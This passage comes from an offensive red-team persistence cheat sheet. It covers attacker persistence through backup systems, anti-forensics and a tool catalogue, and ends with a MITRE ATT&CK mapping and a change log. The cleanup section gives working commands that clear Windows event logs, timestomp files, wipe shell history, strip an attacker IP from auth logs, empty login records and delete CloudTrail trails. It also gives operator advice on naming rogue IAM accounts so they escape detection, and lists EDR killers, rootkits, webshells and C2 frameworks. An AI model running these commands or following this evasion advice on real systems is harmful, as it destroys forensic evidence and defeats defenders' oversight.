   - Add attacker SA / IAM user to credential vault
   - Schedule recurring backup jobs to attacker-controlled storage
   - Configure restore points pointing at attacker S3 / blob storage
2. Cohesity / Rubrik:
   - Same pattern — modify policy / add destination
3. Commvault:
   - CommServ compromise = full org-wide backup access

OPERATOR PERSISTENCE VALUE:
- After ransomware remediation: backup system often last to be audited
- Restore-as-anyone enables restoring deleted attacker artifacts
- Persistent exfil channel via legitimate backup-replication

DETECTION:
- Backup software audit logs (Veeam One, Cohesity Helios, Rubrik audit)
- Network: outbound from backup server to non-corporate destinations
- Anomalous backup destinations / restore destinations
- Defender for Servers: backup-related anomaly detection (Q1 2026 added)

DEFENDER CONTROLS:
- Backup credential rotation cadence (most orgs do not rotate)
- Backup server isolation (separate network segment, restricted access)
- Backup destination allowlist enforcement
- Multi-person approval for restore operations

OPSEC: HIGH — backup systems historically under-audited. Eradication
requires full credential rotation + audit of every restore + every
backup destination + reconfiguration of replication policies.
```

```
═══════════════════════════════════════════════════════════
SECTION 14 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → "Survives organization rebuild" persistence tier
Cross-ref → §6.4 Defender Stack reference (cloud-side detection)
Cross-ref → Initial access §7 cloud + identity-plane initial access
Cross-ref → Initial access §3.10 active recon Veeam / vCenter / SolarWinds
NEVER → Provision new IAM user with literally "attacker" or "test" in
        name; use realistic svc-* / monitoring-* / backup-* naming
NEVER → Create FIC without rotating issuer; reusing operator OIDC issuer
        across engagements creates correlation across victim tenants
```

---

## 15 — CLEANUP & ANTI-FORENSICS

```bash
# ═══════════════════════════════════════════════════════════
# WINDOWS CLEANUP
# ═══════════════════════════════════════════════════════════
# Remove tools from disk
del /f /q C:\ProgramData\svc.exe

# Secure delete (overwrite before delete)
cipher /w:C:\ProgramData\

# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force

# Clear recent commands
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f

# Clear event logs (NOISY — Event ID 1102 generated for Security log clear)
wevtutil cl Security
wevtutil cl System
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-Sysmon/Operational"
wevtutil cl "Microsoft-Windows-TaskScheduler/Operational"

# Selective log deletion (stealthier — remove specific entries)
# - Invoke-Phant0m: suspends Sysmon/EventLog threads → silent log halt
# - EventLogEraser: delete specific Event IDs from .evtx files
# - DanderSpritz EventLogEdit: NSA-leaked tool; selective .evtx editing

# Timestomping
powershell (Get-Item C:\ProgramData\svc.exe).LastWriteTime = (Get-Item C:\Windows\System32\svchost.exe).LastWriteTime
powershell (Get-Item C:\ProgramData\svc.exe).CreationTime = (Get-Item C:\Windows\System32\svchost.exe).CreationTime
powershell (Get-Item C:\ProgramData\svc.exe).LastAccessTime = (Get-Item C:\Windows\System32\svchost.exe).LastAccessTime

# ═══════════════════════════════════════════════════════════
# LINUX CLEANUP
# ═══════════════════════════════════════════════════════════
# Clear bash history
history -c && history -w
unset HISTFILE
echo "" > ~/.bash_history

# Remove from auth logs
sed -i '/attacker_ip/d' /var/log/auth.log
sed -i '/attacker_ip/d' /var/log/secure

# Clear last/wtmp/btmp
echo "" > /var/log/wtmp
echo "" > /var/log/btmp
echo "" > /var/log/lastlog

# Timestomping
touch -r /usr/bin/ls /opt/.cache/session-mgr

# Remove from journal (systemd)
journalctl --vacuum-time=1d

# Secure delete
shred -vfz -n 5 /tmp/payload.elf && rm /tmp/payload.elf

# ═══════════════════════════════════════════════════════════
# CLOUD CLEANUP (significantly more difficult than on-prem)
# ═══════════════════════════════════════════════════════════
# Remove CloudTrail entries: NOT POSSIBLE (CloudTrail is append-only)
# Strategy: use existing service roles/identities generating normal traffic
# Disable/delete CloudTrail (extremely noisy — but blinds future logging)
# aws cloudtrail delete-trail --name management-trail
# Better: operate within SCP guardrails, use legitimate-looking API calls
# Minimize: use temporary credentials (STS AssumeRole) instead of
# long-lived keys

# AZURE: Activity Log retention 90 days minimum; Diagnostic Settings
#        export to Log Analytics workspace adds longer retention
# - Cannot delete Activity Log entries
# - Strategy: minimize per-tenant operator-tied operations; use existing
#   service principal where possible

# GCP: Cloud Audit Logs retention varies (Admin Activity always-on,
#      indefinite by default; Data Access opt-in, 30-day default)
# - Cannot delete audit log entries
# - Same strategy: minimize, blend, use existing identity

# 2024-2026 RETENTION TRENDS:
# - AWS CloudTrail Lake: 7-year retention default for new trails
# - Azure Defender for Cloud: extends Activity Log retention via
#   Continuous Export
# - Google Chronicle: 12-month default retention; longer with paid tiers
# - Operator implication: post-engagement forensics window is wider
#   than ever; assume ALL cloud activity is reconstructable
```

---

## 16 — TOOL QUICK REFERENCE (MAINTENANCE STATUS)

```
═══════════════════════════════════════════════════════════
LEGEND: ✅ Active   ⚠ Stalled / Limited   ❌ Dead / Replaced   $ Paid
═══════════════════════════════════════════════════════════

WINDOWS PERSISTENCE TOOLS:
  ✅ SharPersist             C# persistence toolkit (multiple techniques)
  ✅ Swarmer                  Registry persistence via offline hive manipulation
  ✅ SharpStay                .NET persistence framework
  $  Outflank OST             BOF-based persistence operations (commercial)
  ✅ SharpDLLProxy            DLL proxy/sideloading generator
  ✅ PersistenceSniper        Defender-side audit (open source, maintained);
                             operators should test against it
  ✅ Autoruns (Sysinternals)  Canonical Windows persistence inventory tool;
                             defenders WILL run it
  ✅ SharpHound / BloodHound CE  Attack path analysis (Shadow Cred edges)

AD / IDENTITY PERSISTENCE:
  ✅ Certipy                  Current standard for ADCS + Shadow Cred
                             abuse (Oliver Lyak, maintained)
  ✅ Whisker / pywhisker      Shadow Credentials via msDS-KeyCredentialLink
                             (C# / Python)
  ✅ Rubeus                   Kerberos operations: diamond/sapphire ticket
                             forgery, silver ticket for AZUREADSSOACC$
  ✅ AADInternals             Entra ID / ADFS attack toolkit including
                             Golden SAML (Dr. Nestori Syynimaa)
  ✅ ROADtools                Entra ID enumeration + exploitation
  ✅ ADFSDump                 ADFS config + TSC extraction
  ✅ GraphRunner              DafThack — Microsoft Graph attack suite for
                             post-cred persistence enumeration
  ✅ GraphSpy                 Browser-based Graph attack tool
  ✅ TokenSmith               Token management framework

BYOVD / KERNEL:
  ✅ EDRSandblast             Kernel callback removal + credential dump
  ✅ EDRSilencer              Block EDR network telemetry via WFP
  ✅ KDMapper                 Map unsigned drivers into kernel memory
                             (original iqvw64e.sys [now blocklisted])
  $  Terminator               Generic BYOVD EDR killer
  ✅ Backstab                 Kill EDR processes using Process Explorer driver
  ✅ RealBlindingEDR          Patches kernel callbacks from EDR drivers
  ✅ EDRKillShifter           Aug 2024 Sophos report: rentdrv2.sys-based
                             killer (RansomHub affiliates)
  ⚠  Microsoft driver blocklist  XML policy reference; test against current
                                version to confirm driver viability

LINUX PERSISTENCE:
  ⚠  pam-backdoor             Automated PAM backdoor compilation (legacy)
  ⚠  reptile                  LKM rootkit (older but still functional)
  ⚠  Diamorphine              Simple LKM rootkit (older PoC)
  ✅ linikatz                 Linux credential extraction
  ✅ TripleCross              eBPF rootkit PoC (h3xduck — academic/research)
  ⚠  ebpfkit                  eBPF rootkit PoC (Fournier / DEF CON 29)
  ⚠  BPFDoor samples          Reference implementations for magic-packet-
                             activated backdoor pattern (active 2024-2025
                             per Trend Micro)

LINUX DEFENSIVE-AWARENESS TOOLS (know what hunts you):
  ✅ Falco                    CNCF graduated; eBPF-aware rule engine
  ✅ Tetragon                 Cilium; eBPF-based process / syscall obs
  ✅ Tracee                   Aqua Security; eBPF-based threat detection
  ✅ auditd                   Legacy kernel audit subsystem
  ✅ osquery                  SQL interface to OS state; bpf_process_events
                             table in modern versions

MACOS PERSISTENCE & DEFENSIVE-AWARENESS:
  ✅ sfltool                  Apple-provided CLI: dumpbtm, resetbtm, clear
                             (authoritative BTM inventory)
  ✅ BlockBlock / KnockKnock  Objective-See (Patrick Wardle); persistence
                             monitoring tools that EDR vendors model on
  ✅ DumpBTM                  Wardle tool; programmatic BTM enumeration
                             including bypass-resilient paths
  ✅ launchctl list           LaunchAgent / LaunchDaemon enumeration
  ✅ codesign -dvvv           Signature inspection — catches ad-hoc / unsigned
  ⚠  PersistentJaeger         macOS persistence research tool

WEB PERSISTENCE:
  ✅ weevely                  Stealth PHP webshell generator
  ✅ p0wny-shell              Minimal PHP webshell
  ✅ Godzilla                 Java/PHP/ASPX webshell framework
  ✅ SharpWebServer           C# webshell / mini HTTP server

CLOUD PERSISTENCE:
  ✅ Pacu                     AWS exploitation framework (persistence modules)
  ✅ ROADtools                Azure AD persistence + enumeration
  ✅ AADInternals             Azure AD / Entra ID attack toolkit
  ✅ Stratus Red Team         Cloud attack emulation (AWS / Azure / GCP)
  ✅ CloudFox                 Cloud attack surface enumeration
  ✅ PurpleCloud              Cloud purple-team exercises
  ✅ TeamFiltration           O365/Entra enumeration + AiTM
  ✅ CloudPEASS               Privesc / persistence enum (Pentest-Bonsai)

K8s / CONTAINER:
  ✅ kube-hunter              Aqua Security; K8s vuln scanner
  ✅ kubeletctl               Kubelet-API interaction
  ✅ peirates                 K8s pentest swiss-army-knife
  ✅ kube-bench               CIS K8s benchmark scanner

SUPPLY CHAIN:
  ✅ sigstore / cosign        Artifact signing + verification (defender)
  ✅ in-toto                  End-to-end build attestation (defender)
  ✅ SLSA                     Supply-chain Levels for Software Artifacts

C2 FRAMEWORKS:
  $  Cobalt Strike            Commercial C2 — Beacon persistence via BOFs
  ✅ Sliver                   Open-source C2 — implant persistence
  ✅ Mythic                   Open-source C2 — modular agents
  ✅ Havoc                    Open-source C2 — modern design
  $  Brute Ratel              Commercial C2 — EDR evasion focus
  $  Nighthawk                Commercial C2 — competing offering
```

---

## 17 — MITRE ATT&CK MAPPING MATRIX

```
═══════════════════════════════════════════════════════════
TA0003 PERSISTENCE — COMPLETE TECHNIQUE COVERAGE
═══════════════════════════════════════════════════════════

T1053 — Scheduled Task/Job
  ├── T1053.003 Cron                          → §7.1, §8.3
  ├── T1053.005 Scheduled Task                → §3.1
  └── T1053.006 Systemd Timers                → §8.2

T1098 — Account Manipulation
  ├── T1098.001 Additional Cloud Credentials  → §14.1, §14.2
  ├── T1098.003 Additional Cloud Roles        → §14.1, §14.2
  ├── T1098.004 SSH Authorized Keys           → §7.3, §8.5
  └── T1098.005 Device Registration           → Initial access §2.1, §7.9

T1136 — Create Account
  ├── T1136.001 Local Account                 → §3.X (NetExec abuse, etc.)
  ├── T1136.002 Domain Account                → §5.10 (Machine Account Quota)
  └── T1136.003 Cloud Account                 → §14.9 (SCIM), §14.10
                                                (SSO IdP)

T1176 — Browser Extensions                    → §12.6, §12.7

T1197 — BITS Jobs                             → §3.9

T1505 — Server Software Component
  └── T1505.003 Web Shell                     → §8.10, §12.1

T1525 — Implant Internal Image                → §13.5, §13.6

T1543 — Create or Modify System Process
  ├── T1543.001 Launch Agent                  → §11.2
  ├── T1543.002 Systemd Service               → §8.1
  ├── T1543.003 Windows Service               → §3.2
  └── T1543.004 Launch Daemon                 → §11.3

T1546 — Event Triggered Execution
  ├── T1546.002 Screensaver                   → §3.X
  ├── T1546.003 WMI Event Subscription        → §3.3
  ├── T1546.004 Unix Shell Configuration Mod  → §7.2
  ├── T1546.007 Netsh Helper DLL              → §3.8
  ├── T1546.008 Accessibility Features        → §3.5
  ├── T1546.010 AppInit DLLs                  → §3.10
  ├── T1546.012 IFEO Injection                → §3.4
  ├── T1546.013 PowerShell Profile            → §2.5
  └── T1546.015 COM Hijacking                 → §2.3

T1547 — Boot or Logon Autostart Execution
  ├── T1547.001 Registry Run Keys / Startup   → §2.1, §2.2
  ├── T1547.002 Authentication Package        → §3.11
  ├── T1547.003 Time Providers                → §3.12
  ├── T1547.004 Winlogon Helper DLL           → §3.7
  ├── T1547.005 Security Support Provider     → §5.9
  ├── T1547.006 Kernel Modules + Extensions   → §9.3
  ├── T1547.010 Port Monitors                 → §3.12
  ├── T1547.014 Active Setup                  → §3.6
  └── T1547.015 Login Items                   → §11.4

T1548 — Abuse Elevation Control Mechanism
  └── T1548.001 Setuid/Setgid                 → §9.4

T1550 — Use Alternate Authentication Material
  └── T1550.001 Application Access Token      → §12.5, §14.7, §14.8

T1556 — Modify Authentication Process
  ├── T1556.001 Domain Controller Auth        → §5.6 (Skeleton Key)
  ├── T1556.003 Pluggable Authentication Mods → §8.6
  └── T1556.007 Hybrid Identity / Shadow Cred → §5.4

T1558 — Steal or Forge Kerberos Tickets
  └── T1558.001 Golden Ticket / Diamond /     → §5.1, §5.2, §14.5
       Sapphire / AZUREADSSOACC$

T1574 — Hijack Execution Flow
  ├── T1574.001 DLL Search Order Hijacking    → §2.4
  ├── T1574.002 DLL Side-Loading              → §2.4
  ├── T1574.004 Dylib Hijacking               → §11.6
  └── T1574.006 Dynamic Linker Hijacking      → §9.2

T1014 — Rootkit                               → §9.1 (eBPF), §9.3 (LKM),
                                                §4.1 (BYOVD chain)

T1068 — Exploitation for Privilege Escalation → §4.1 (BYOVD enabler)

T1078 — Valid Accounts
  └── T1078.004 Cloud Accounts                → §14 (multiple)

T1199 — Trusted Relationship                  → §3.13 (SCCM/Intune),
                                                §14.10 (SSO IdP),
                                                §14.11 (Backup)

T1484 — Domain or Tenant Policy Modification  → §5.5 (AdminSDHolder),
                                                §5.11 (AD CS template),
                                                §14.10 (CA policy)

T1542 — Pre-OS Boot
  ├── T1542.001 System Firmware               → §4.2 (UEFI)
  └── T1542.003 Bootkit                       → §4.2 (BlackLotus)

T1565 — Data Manipulation                     → §14.11 (Backup abuse)

T1583 — Acquire Infrastructure
  └── T1583.002 DNS Server                    → §12.8 (Subdomain takeover),
                                                §12.9 (DNS provider)

T1606 — Forge Web Credentials
  ├── T1606.001 Web Cookies                   → §12.4 (JWT key theft)
  └── T1606.002 SAML Tokens                   → §14.6 (Golden SAML)

T1610 — Deploy Container                      → §13.2 (DaemonSet),
                                                §13.5, §13.6

T1611 — Escape to Host                        → §13 (privileged container)

T1649 — Steal or Forge Authentication Certs   → §5.3 (Golden Cert), §5.11

T1195 — Supply Chain Compromise
  ├── T1195.001 Software Dependencies + Tools → §13.6 (Helm), §13.7 (GitHub
                                                Actions)
  └── T1195.002 Software Supply Chain         → §3.14 (WSUS), §13.5
                                                (container image)
```

---

## CHANGE SUMMARY (vs. prior revision dated 02 April 2026)

**Critical fixes:** None (original document had no Critical errors).

**Major additions:**

- **§0** — Extended Persistence Survival Matrix with new techniques:
  SCCM/Intune Agent Abuse, WSUS Patch Poisoning, Diamond/Sapphire Ticket,
  SCIM-Provisioned User, Subdomain Takeover, SSO IdP Admin Backdoor,
  HashiCorp Vault Root Token, Federated Identity Credential (FIC),
  Microsoft Graph Subscription / Webhook, EventBridge / Lambda URL,
  Helm Chart / OCI Image, GitHub Actions Self-Hosted Runner, Mutating
  Webhook (K8s), Browser Extension, VS Code / IDE Extension, DNS Provider
  Admin Backdoor, Edge Function (Cloudflare Workers / Vercel / Netlify),
  Backup System Persistence, SCCM/Intune Mgmt-Agent Push.
- **§1** — Layered Persistence Doctrine extended with new chains:
  Management-Plane chain (SCCM/Intune/Tanium), Extortion-and-Ransomware
  chain (Veeam → ESXi), Identity-Plane Continuous-Recovery chain.
  Added Layer 6 (Supply / Mgmt) to layering recommendation.
- **§3.13** — NEW: SCCM / Intune / Tanium / Workspace ONE management-
  agent persistence (G1) — major 2024-2026 nation-state pattern (Volt
  Typhoon adjacent + Salt Typhoon).
- **§3.14** — NEW: WSUS / SCCM patch poisoning (G2) — update-server-as-
  malware-distribution.
- **§4.1** — Updated BYOVD with Silver Fox campaign (Aug 2025; amsdk.sys
  + Zemana SDK; ValleyRAT delivery; "blocklist-lag operator window"
  pattern). Source: [Check Point Silver Fox Research](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/) · [ThaiCERT kill-floor.exe](https://www.thaicert.or.th/en/2024/11/25/hackers-exploit-vulnerability-in-avast-anti-rootkit-driver-to-disable-security-systems/) · [Sophos EDRKillShifter](https://news.sophos.com/en-us/2024/08/14/edr-kill-shifter/)
- **§4.2** — Updated UEFI section with **CRITICAL Q1-Q2 2026 BlackLotus
  timeline**: Windows Production PCA 2011 certificate **EXPIRES OCTOBER
  2026**; Enforcement Phase earliest January 2026 with 6-month warning.
  HARD EXPIRATION WINDOW for BlackLotus-class techniques. Source: [MS BlackLotus Boot Manager Revocations](https://support.microsoft.com/en-us/topic/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d)
- **§5.11** — NEW: AD CS Cert Template Manipulation (G17) — beyond Golden
  Cert; ESC1-ESC16 family extended for persistence (EnrolleeSuppliesSubject
  + Domain Computers enrollment, vulnerable cert template ACL, NTLM
  relay to AD CS web enrollment).
- **§6.4** — NEW: Defender Stack Reference (Windows-side) (R2) —
  per-product visibility map for persistence-specific detection
  (MDE / MDI / MDCA / Defender XDR / CrowdStrike / SentinelOne).
- **§10.4** — NEW: Defender Stack Reference (Linux-side) (R2) —
  MDE Linux / CrowdStrike Falcon Linux / S1 / Elastic Defend / Falco /
  Tetragon / Tracee / auditd / osquery.
- **§11.10** — NEW: Defender Stack Reference (macOS-side) (R2) —
  CrowdStrike Falcon for Mac / SentinelOne macOS / Jamf Protect / Sophos
  Intercept X for Mac / Huntress macOS / native Apple security framework.
- **§9.1** — eBPF rootkit section validated current with LinkPro
  (Synacktiv October 2025) and BPFDoor 2024-2025 activity (Trend Micro
  April 2025 reporting). Sources: [Synacktiv LinkPro](https://www.synacktiv.com/en/publications/linkpro-ebpf-rootkit-analysis) · [Trend Micro BPFDoor April 2025](https://www.trendmicro.com/en_us/research/25/d/bpfdoor-hidden-controller.html)
- **§11.1** — Updated macOS BTM baseline with Q1-Q2 2026 status:
  NO documented BTM bypass updates 2024-2026 beyond Wardle DEF CON 31
  (August 2023); Apple's earlier fixes did not address root design
  issues. Bypass remains research-grade.
- **§11.10** — Added Apple Endpoint Security Framework attribution
  correction (Apple-developed, not Microsoft).
- **§12.6** — EXPANDED: Browser extension persistence (M4) with full
  Cyberhaven-era context (Dec 2024 — 400k+ users; cascade to 30+
  extensions affecting 2.6M users; Chrome Web Store 2FA mandate Q2
  2025; Microsoft Defender for Cloud Apps "Suspicious browser extension"
  alert Q1 2026). Source: [Cyberhaven Incident Response](https://www.cyberhaven.com/blog/cyberhavens-chrome-extension-security-incident-and-what-were-doing-about-it)
- **§12.7** — NEW: IDE Marketplace Extension Persistence (M3) — VS Code
  4× malicious-extension surge in 2025 (105 in 10 months vs 27 in 2024);
  OctoRAT / Anivia loader chain (Nov 2025); developer-machine credential-
  rich environment value. Source: [Hunt.io VS Code OctoRAT/Anivia](https://hunt.io/blog/malicious-vscode-extension-anivia-octorat-attack-chain)
- **§12.8** — NEW: Subdomain takeover for persistent phishing infrastructure
  (G16) — cross-ref initial access §7.8.
- **§12.9** — NEW: DNS Provider Admin Compromise + CDN Edge Function
  Persistence (G8 + G9).
- **§13.3** — Mutating Webhook section updated with OPA Gatekeeper /
  Kyverno defender control context (Q1 2026 adoption rising).
- **§13.4** — SA Token Theft section validated current with Kubernetes
  TokenRequest API v1.24+ behavior (~1 hour default; auto-rotated at
  80% TTL or 24hrs). Source: [Kubernetes Service Accounts](https://kubernetes.io/docs/concepts/security/service-accounts/)
- **§13.6** — NEW: Helm Chart / OCI Registry supply chain persistence
  (G6) — 9,000+ public Helm charts on Artifact Hub; Microsoft Defender
  for Cloud May 2025 warning on YAML injection risks.
- **§13.7** — NEW: GitHub Actions Self-Hosted Runner persistence (G6) —
  cross-ref initial access §8.6.
- **§14** — Cloud section restructured into 11 subsections (R2):
  - §14.1 AWS extended (Lambda Function URL persistence, EventBridge
    + Lambda chain, SCP manipulation)
  - §14.2 Azure extended with FIC depth (M10) — `az identity
    federated-credential` command; max 20 FICs per identity; no
    on-tenant secret. Source: [MS Learn Workload Identity Federation](https://learn.microsoft.com/en-us/entra/workload-id/workload-identity-federation-create-trust-user-assigned-managed-identity)
  - §14.2 PIM elevation abuse + cross-tenant access policy abuse
    (Storm-0501 pattern)
  - §14.3 GCP extended (Workload Identity Federation, Workspace Admin
    SDK abuse)
  - §14.4 O365 identity layer (mail-flow rules, transport rules,
    Power Automate flows, eDiscovery, CA policy manipulation)
  - §14.5 AZUREADSSOACC$ deep-dive preserved with Microsoft 30-day
    rotation guidance
  - §14.6 ADFS Golden SAML preserved
  - §14.7 NEW: Microsoft Graph subscriptions / change notifications
    (M5) — persistent silent exfil channel via webhook. Source: [MS Learn Graph Subscriptions](https://learn.microsoft.com/en-us/graph/change-notifications-overview)
  - §14.8 NEW: SaaS-to-SaaS OAuth pivot persistence (G7) — cross-ref
    initial access §7.6
  - §14.9 NEW: SCIM-provisioned user persistence (G15) — cross-ref
    initial access §7.7
  - §14.10 NEW: SSO IdP admin backdoor (G3) + HashiCorp Vault root
    token (G4)
  - §14.11 NEW: Backup System persistence (G5) — Veeam CVE landscape
    cross-ref; restore-as-anyone capability + backup-credential
    persistence
- **§15** — Cloud cleanup section extended with 2024-2026 retention
  trends (CloudTrail Lake 7-year default, Defender for Cloud Continuous
  Export, Chronicle 12-month default).
- **§16** — Tool Reference restructured with maintenance status legend
  (✅/⚠/❌/$) (R4); added GraphRunner / GraphSpy / TokenSmith;
  EDRKillShifter (Aug 2024 Sophos); Defender-side tools (Falco /
  Tetragon / Tracee / sfltool / DumpBTM / BlockBlock / KnockKnock /
  Autoruns / PersistenceSniper).
- **§17** — NEW: Standalone MITRE ATT&CK Mapping Matrix (R3) — TA0003
  full sub-technique enumeration.
- **§6.3** — Extended KQL hunting queries (Diamond/Sapphire detection,
  AZUREADSSOACC$ Kerberos pattern, SCCM/Intune mass deployment anomaly,
  AD CS template manipulation, FIC anomaly).

**Reframing:**
- Document preamble added explicit OPSEC taxonomy (STEALTH / SURVIVABILITY
  / CLEANUP COST / DETECTION COST) with persistence-specific dimensions
  parallel to other rebuilt docs.
- Per-technique banner format with consistent fields.
- Cross-reference notation §X.Y used throughout (and to other rebuilt
  cheatsheets 01-03).
- Layer 6 (Supply / Management Plane) added to layering doctrine.

**Removed:**
- "BYOVD as persistence" framing (it's a privesc/evasion enabler, not
  persistence by itself) — clarified throughout §4.1.
- Outdated implication that LSA Authentication Package always works
  (LSA protection caveat now consistently flagged).

---

## OUTSTANDING ITEMS — UNVERIFIED / EMERGING / CONTESTED

| Item | Status | Evidence Required to Resolve |
|---|---|---|
| BlackLotus PCA 2011 expiration impact at scale | **Confirmed Oct 2026** — but exact post-expiration enforcement behavior (full block vs. degraded warning) may shift; Microsoft's multi-phase rollout designed to avoid bricking recovery media. | Microsoft post-Oct-2026 deployment guidance. |
| Patrick Wardle BTM bypass design weakness post-2023 | **Confirmed unaddressed** as of April 2026 — Apple's fixes did not address root issues per Wardle. May change with macOS 16. | Wardle research published per WWDC 2026 announcements; macOS 16 release notes. |
| Silver Fox WatchDog amsdk.sys driver blocklist status | **Verified August 2025** — not in Microsoft Vulnerable Driver Blocklist at time of campaign. May be added in subsequent blocklist update; verify before relying. | Microsoft Vulnerable Driver Blocklist current XML check. |
| LinkPro eBPF rootkit lateral spread | **Confirmed in K8s** — but specific clusters affected, victim identities not disclosed. | Mandiant or Google TAG follow-on reporting. |
| BPFDoor controller April 2025 attribution | **Confirmed (Trend Micro Earth Bluecrow attribution)** — but cross-vendor naming may differ; Mandiant / CrowdStrike attribution may use different identifier. | Cross-vendor attribution alignment over time. |
| Cyberhaven cascade victim count | **Confirmed (industry reporting widespread, 2.6M users across 30+ extensions)** — exact extension list incomplete in primary sources. | Cyberhaven retrospective; Chrome Web Store enforcement disclosure. |
| Helm chart compromise 2024-2025 incident | **Limited primary sources** — Chaos Mesh K8s incidents used Helm but no Helm-EXCLUSIVE supply chain compromise verified. | Defender for Cloud / Aqua / Sysdig research follow-up. |
| Microsoft Vulnerable Driver Blocklist refresh cadence Q2 2026 | **Stable but variable** — typically 1-2 refresh cycles per year per Microsoft Learn. | Per-engagement check via App Control for Business policy export. |
| Token lifetime defaults across Azure / AWS / GCP managed identity | **Volatile** — vendors continually adjust default token TTLs as security posture evolves. | Per-engagement vendor docs check. |
| Microsoft Graph subscription max duration changes | **Stable as of Q2 2026** — Mail/Calendar/Contacts: 3 days; Drive: 30 days; Teams chat: 60 minutes. May change in v2 Graph. | MS Graph subscription docs check. |
| Cyberhaven cascade VS Code extension overlap | **Unverified** — Hunt.io reports 105 VS Code extensions in first 10 months 2025 but precise overlap with Cyberhaven supply chain victims unclear. | Hunt.io / Aqua / Snyk research correlation. |
| SCIM-provisioned-user defender-detection coverage | **Emerging** — 2025-2026 saw initial CSPM coverage but per-vendor capability varies. | CSPM vendor capability matrix as it evolves. |
| Federation Identity Credential (FIC) operator-detection 2026 | **Improving** — Microsoft Defender for Cloud Apps Q1 2026 added FIC anomaly alerts; coverage maturing. | MDCA SaaS Security Posture Management roadmap. |
| Azure Activity Log retention guarantees | **Volatile** — Microsoft has been extending defaults; per-tenant Continuous Export configuration determines actual retention. | Per-engagement tenant config check. |
| eBPF detection coverage in Defender for Endpoint Linux | **Improving 2024-2026** — eBPF-native sensor capability rolled out gradually; varies by version. | MDE Linux release notes. |

---

***Valid as of 28 April 2026***

*Mapped to: MITRE ATT&CK TA0003 (Persistence). Full technique coverage in §17. Companion documents: §01 Passive Reconnaissance · §02 Active Reconnaissance · §03 Initial Access · §05 Privilege Escalation · §06 Lateral Movement · §07 Exfiltration · §08 Active Directory · §09-12 Web/App/Mobile/Wireless · §13 Wireless.*
